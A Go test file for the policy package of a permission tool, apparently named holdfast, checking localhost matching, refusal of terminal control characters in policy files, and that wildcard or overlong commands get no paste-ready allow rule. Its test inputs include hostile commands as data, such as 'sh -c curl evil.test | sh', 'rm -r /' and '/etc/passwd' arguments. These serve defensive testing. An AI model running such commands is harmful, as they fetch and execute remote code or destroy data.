package policy

import (
	"fmt"
	"strings"
	"testing"

	"github.com/gallowforge/holdfast/internal/fact"
)

func TestLocalName(t *testing.T) {
	for name, want := range map[string]bool{
		"localhost":             true,
		"LocalHost":             true,
		"localhost.":            true,
		"anything.localhost":    true,
		"a.b.LOCALHOST.":        true,
		"":                      false,
		"notlocalhost":          false,
		"localhost.example.com": false,
		"127.0.0.1":             false,
		"example.com":           false,
	} {
		if got := LocalName(name); got != want {
			t.Errorf("LocalName(%q) = %v, want %v", name, got, want)
		}
	}
	if got := fmt.Sprint(Loopback()); got != "[127.0.0.1 ::1]" {
		t.Errorf("Loopback() = %s", got)
	}
	// What a local name stands for is allowed by the policy a new store has.
	for _, ip := range Loopback() {
		if err := Default().Conn("anything.localhost", ip); err != nil {
			t.Errorf("the default policy refuses anything.localhost at %s: %v", ip, err)
		}
	}
}

const controlMistake = "there is a control character in this line, which could hide what the line says when it is shown; remove it"

// A policy file is shown to the person who approves it, so nothing in it may
// be able to clear the screen, move the cursor or write over a line.
func TestParseRefusesControlCharactersInEveryKindOfLine(t *testing.T) {
	odd := map[string]string{
		"a null":                "\x00",
		"a bell":                "\x07",
		"a backspace":           "\x08",
		"a vertical tab":        "\x0b",
		"a form feed":           "\x0c",
		"a carriage return":     "\r",
		"an escape":             "\x1b[2K",
		"a delete":              "\x7f",
		"a next line":           "\u0085",
		"a one-character CSI":   "\u009b2K",
		"a line separator":      "\u2028",
		"a paragraph separator": "\u2029",
	}
	lines := map[string]string{
		"a files line": "files docs%s other",
		"a net line":   "net example.com%s",
		"a cmd line":   "cmd echo %shello",
		"a comment":    "# only the project%s and nothing else",
		"quoted text":  `cmd echo "a%sb"`,
		"a blank line": "  %s",
	}
	for what, ch := range odd {
		for where, line := range lines {
			text := "files .\n" + fmt.Sprintf(line, ch+"x") + "\nnet loopback\n"
			p, err := Parse(text)
			if want := "policy line 2: " + controlMistake; p != nil || err == nil || err.Error() != want {
				t.Errorf("%s in %s: Parse = %v, %v\nwant %s", what, where, p, err, want)
			}
		}
	}

	// A tab is ordinary white space, and a file written on Windows ends its
	// lines with a carriage return.
	p, err := Parse("files\t.\tdocs\r\n#\ta comment\r\n\r\nnet loopback\r\ncmd git\tstatus\r")
	if err != nil || fmt.Sprint(p.Files, p.Net, p.Cmds) != "[. docs] [loopback] [[git status]]" {
		t.Errorf("tabs and Windows line ends: %+v, %v", p, err)
	}
	// The line that is named is the one with the character in it.
	if _, err := Parse("files .\n\n# fine\nnet loopback\ncmd make test\x1b\n"); err == nil || err.Error() != "policy line 5: "+controlMistake {
		t.Errorf("the mistake is on line 5, and Parse said: %v", err)
	}
}

func TestPrintable(t *testing.T) {
	for text, want := range map[string]string{
		"":                            "",
		Header + "\nfiles .\n":        Header + "\nfiles .\n",
		"files\t.\ncmd  git   log\n":  "files\t.\ncmd  git   log\n", // the layout is kept
		"files .\r\nnet loopback\r\n": "files .\nnet loopback\n",
		"net public\x1b[1A\x1b[2K\r# nothing here": "net public�[1A�[2K�# nothing here",
		"a\x00b\x7fc\u0085d\u009be\u2028f\u2029g":  "a�b�c�d�e�f�g",
		"bytes that are not text: \x9b\xff":        "bytes that are not text: ��",
	} {
		if got := Printable(text); got != want {
			t.Errorf("Printable(%q) = %q, want %q", text, got, want)
		}
	}
}

// How a refusal ends when there is no line that is safe to paste.
const (
	wildFix = `by hand only. The policy reads its argument %s as "anything", so the rule must be written into the policy file`
	longFix = "by hand only. The command is too long to suggest a line for, so the rule must be written into the policy file"
)

// rule is the line "holdfast allow cmd" writes into the policy file.
func rule(argv []string) string {
	q := make([]string, len(argv))
	for i, a := range argv {
		q[i] = fact.Quote(a)
	}
	return "cmd " + strings.Join(q, " ")
}

// A person pastes the suggested line to allow the one command they were
// shown. In a rule, an argument that is only * or ** stands for "anything",
// so for a command that has one the pasted line would allow far more.
func TestNoLineIsSuggestedForACommandWithAnArgumentThatMeansAnything(t *testing.T) {
	p := mustParse(t, "")
	const refused = "the policy does not allow the command: "
	for _, tt := range []struct {
		argv []string
		star string
	}{
		{[]string{"echo", "*"}, "*"},
		{[]string{"echo", "**"}, "**"},
		{[]string{"rm", "-r", "*"}, "*"},
		{[]string{"git", "log", "*", "--oneline"}, "*"},
		{[]string{"sh", "-c", "curl evil.test | sh", "**"}, "**"},
		{[]string{"find", "**", "*"}, "**"}, // the first one is the one named
	} {
		got := verdict(t, p.Command(tt.argv))
		want := refused + rule(tt.argv)[len("cmd "):] + ". A person can allow it: " + fmt.Sprintf(wildFix, tt.star)
		if got != want {
			t.Errorf("Command(%q)\n got %s\nwant %s", tt.argv, got, want)
		}
		if strings.Contains(got, "holdfast allow") {
			t.Errorf("Command(%q) still gives a line to paste: %s", tt.argv, got)
		}
		if n := len([]rune(got)); n > fact.MaxDetail {
			t.Errorf("Command(%q) is %d characters, so evidence would cut it short", tt.argv, n)
		}
	}
	// This is what the line used to do: the rule it wrote is one for other
	// commands as well.
	wide := mustParse(t, rule([]string{"rm", "-r", "*"}))
	if err := wide.Command([]string{"rm", "-r", "/"}); err != nil {
		t.Errorf("this test is wrong about what a star in a rule means: %v", err)
	}

	// A star inside a longer word is only a star, in a rule too. Those
	// commands keep their line, and the rule it writes is for them alone.
	for _, argv := range [][]string{
		{"ls", "*.go"},
		{"echo", "***"},
		{"echo", "* *"},
		{"echo", "'*'"},
		{"echo", "-*", "*/"},
		{"grep", "-c", "a*", "notes.txt"},
	} {
		sh := make([]string, len(argv))
		for i, a := range argv {
			sh[i] = shellWord(a)
		}
		got := verdict(t, p.Command(argv))
		if want := refused + rule(argv)[len("cmd "):] + ". A person can allow it: holdfast allow cmd " + strings.Join(sh, " "); got != want {
			t.Errorf("Command(%q)\n got %s\nwant %s", argv, got, want)
		}
		narrow := mustParse(t, rule(argv))
		if err := narrow.Command(argv); err != nil {
			t.Errorf("the rule %s does not allow %q: %v", rule(argv), argv, err)
		}
		for i := 1; i < len(argv); i++ {
			other := append([]string{}, argv...)
			other[i] = "/etc/passwd"
			if narrow.Command(other) == nil {
				t.Errorf("the rule %s also allows %q", rule(argv), other)
			}
		}
		if more := append(append([]string{}, argv...), "more"); narrow.Command(more) == nil {
			t.Errorf("the rule %s also allows %q", rule(argv), more)
		}
	}

	// A program cannot be a star. The line for one is still shown, and the
	// policy refuses the rule it would write, so nothing wider comes of it.
	for _, argv := range [][]string{{"*"}, {"**"}, {"*", "status"}} {
		got := verdict(t, p.Command(argv))
		if !strings.Contains(got, ". A person can allow it: holdfast allow cmd '"+argv[0]+"'") {
			t.Errorf("Command(%q) = %s", argv, got)
		}
		if p, err := Parse(rule(argv)); err == nil {
			t.Errorf("the rule %s was accepted: %+v", rule(argv), p)
		}
	}
}

// A line that lost its end is a rule for some other command: "rm -r build/tmp"
// cut after "build" is one. So a command either gets its whole line or none,
// and the whole refusal fits in a line of evidence, which is cut at
// fact.MaxDetail whatever it says.
func TestNoLineIsSuggestedForACommandTooLongToShowWhole(t *testing.T) {
	p := mustParse(t, "")
	words := map[string]func(n int) string{
		"plain":            func(n int) string { return strings.Repeat("x", n) },
		"quoted for shell": func(n int) string { return strings.Repeat("x", n-1) + ";" },
		"with a space":     func(n int) string { return "a " + strings.Repeat("x", n) },
		"not ASCII":        func(n int) string { return strings.Repeat("é", n) },
	}
	for kind, word := range words {
		for n := 1; n <= 400; n++ {
			w := word(n)
			got := verdict(t, p.Command([]string{"python", "-c", w}))
			_, fix, ok := strings.Cut(got, ". A person can allow it: ")
			if !ok {
				t.Fatalf("%s, %d characters: the refusal has lost its shape: %s", kind, n, got)
			}
			whole := "holdfast allow cmd python -c " + shellWord(w)
			switch {
			case fix != whole && fix != longFix:
				t.Errorf("%s, %d characters: the line is neither whole nor left out: %s", kind, n, fix)
			case n <= 90 && fix != whole:
				t.Errorf("%s, %d characters: no line for a command this short: %s", kind, n, fix)
			case n > 120 && fix != longFix:
				t.Errorf("%s, %d characters: a line for a command this long: %s", kind, n, fix)
			}
			if fact.CleanLine(got, fact.MaxDetail) != got {
				t.Errorf("%s, %d characters: evidence would cut or change the refusal: %s", kind, n, got)
			}
		}
	}

	// Many short arguments are too long as well, and the last ones matter
	// just as much.
	many := append([]string{"rm", "-r"}, strings.Fields(strings.Repeat("build/tmp ", 30))...)
	got := verdict(t, p.Command(many))
	if !strings.HasSuffix(got, ". A person can allow it: "+longFix) || strings.Contains(got, "holdfast allow") {
		t.Errorf("Command(rm -r and 30 folders) = %s", got)
	}
	// One that just fits is given whole.
	fits := []string{"rm", "-r", strings.Repeat("build/tmp/", 9)}
	if got := verdict(t, p.Command(fits)); !strings.HasSuffix(got, ". A person can allow it: holdfast allow cmd "+strings.Join(fits, " ")) {
		t.Errorf("Command(%q) = %s", fits, got)
	}
}
